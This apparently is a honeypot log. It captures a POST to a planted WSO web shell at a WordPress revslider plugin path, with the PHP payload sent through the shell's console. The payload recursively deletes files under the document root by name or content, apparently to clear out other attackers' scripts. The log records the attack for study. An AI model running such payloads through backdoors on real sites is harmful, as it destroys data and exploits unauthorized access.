
_SERVER
Array
(
    [UNIQUE_ID] => WqzNnZUsshqHjkbgopBNnQAAAAQ
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => stratigery.com
    [HTTP_CONNECTION] => close
    [HTTP_ACCEPT_ENCODING] => gzip,deflate
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [CONTENT_LENGTH] => 2558
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130331 Firefox/21.0
    [HTTP_COOKIE] => d8670190bc460b6abebf276d20db5892=866fd58d77526c1bda8771b5b21d5b11
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.2.3
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 195.154.220.30
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 58545
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1521274269.568
    [REQUEST_TIME] => 1521274269
)

_REQUEST
Array
(
    [a] => Php
    [p1] => @set_time_limit(0);
@ini_set("memory_limit", "512M");


function array_strstr($haystack, $needles)
{
	foreach($needles as $needle)
		if(strpos($haystack, $needle))
			return true;
    
    
return false;
}

function array_strcmp($haystack, $needles)
{
	foreach($needles as $needle)
		if(!strncmp($haystack, $needle, strlen($haystack)))
			return true;
    
    
return false;
}

function DelByPartOfName($dir, $t_match) 
{
	$dir = rtrim($dir, '\\/');
	$h = @opendir($dir);
	
	
		while(($f = @readdir($h)) !== false) 
		{
			if($f !== '.' && $f !== '..') 
			{
				if(is_dir("$dir/$f")) 
					DelByPartOfName("$dir/$f", $t_match);
		
				if(is_file("$dir/$f"))
				{
					if(array_strcmp($f, $t_match))
					{
						echo "Delete: $dir/$f"."<br>";
						@unlink("$dir/$f");
					}
				}
			}
		}
		
		closedir($h);
}

function DelByPartOfText($dir, $t_match) 
{
	$dir = rtrim($dir, '\\/');
	$h = @opendir($dir);
	
	
		while(($f = @readdir($h)) !== false) 
		{
			if($f !== '.' && $f !== '..') 
			{
				if(is_dir("$dir/$f")) 
					DelByPartOfText("$dir/$f", $t_match);
		
				if(is_file("$dir/$f") && strncmp("$dir/$f", realpath(__FILE__), strlen("$dir/$f")) != 0)
				{
					if(array_strstr(@file_get_contents("$dir/$f"), $t_match))
					{
						echo "Delete: $dir/$f"."<br>";
						@unlink("$dir/$f");
					}
				}
			}
		}
		
		closedir($h);
}


$full_name = array("infodata.php", "mail.php", "post.php", "wlomaz.zip");

echo "Search in: ".$_SERVER["DOCUMENT_ROOT"]."<br><br>";

DelByPartOfName($_SERVER["DOCUMENT_ROOT"], $full_name);
)

_COOKIE
 Array
(
    [d8670190bc460b6abebf276d20db5892] => 866fd58d77526c1bda8771b5b21d5b11
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
Acting as WSO, login cookie.
a = Php
p1 = @set_time_limit(0);
@ini_set("memory_limit", "512M");


function array_strstr($haystack, $needles)
{
	foreach($needles as $needle)
		if(strpos($haystack, $needle))
			return true;
    
    
return false;
}

function array_strcmp($haystack, $needles)
{
	foreach($needles as $needle)
		if(!strncmp($haystack, $needle, strlen($haystack)))
			return true;
    
    
return false;
}

function DelByPartOfName($dir, $t_match) 
{
	$dir = rtrim($dir, '\\/');
	$h = @opendir($dir);
	
	
		while(($f = @readdir($h)) !== false) 
		{
			if($f !== '.' && $f !== '..') 
			{
				if(is_dir("$dir/$f")) 
					DelByPartOfName("$dir/$f", $t_match);
		
				if(is_file("$dir/$f"))
				{
					if(array_strcmp($f, $t_match))
					{
						echo "Delete: $dir/$f"."<br>";
						@unlink("$dir/$f");
					}
				}
			}
		}
		
		closedir($h);
}

function DelByPartOfText($dir, $t_match) 
{
	$dir = rtrim($dir, '\\/');
	$h = @opendir($dir);
	
	
		while(($f = @readdir($h)) !== false) 
		{
			if($f !== '.' && $f !== '..') 
			{
				if(is_dir("$dir/$f")) 
					DelByPartOfText("$dir/$f", $t_match);
		
				if(is_file("$dir/$f") && strncmp("$dir/$f", realpath(__FILE__), strlen("$dir/$f")) != 0)
				{
					if(array_strstr(@file_get_contents("$dir/$f"), $t_match))
					{
						echo "Delete: $dir/$f"."<br>";
						@unlink("$dir/$f");
					}
				}
			}
		}
		
		closedir($h);
}


$full_name = array("infodata.php", "mail.php", "post.php", "wlomaz.zip");

echo "Search in: ".$_SERVER["DOCUMENT_ROOT"]."<br><br>";

DelByPartOfName($_SERVER["DOCUMENT_ROOT"], $full_name);
Acting as WSO, send php console.
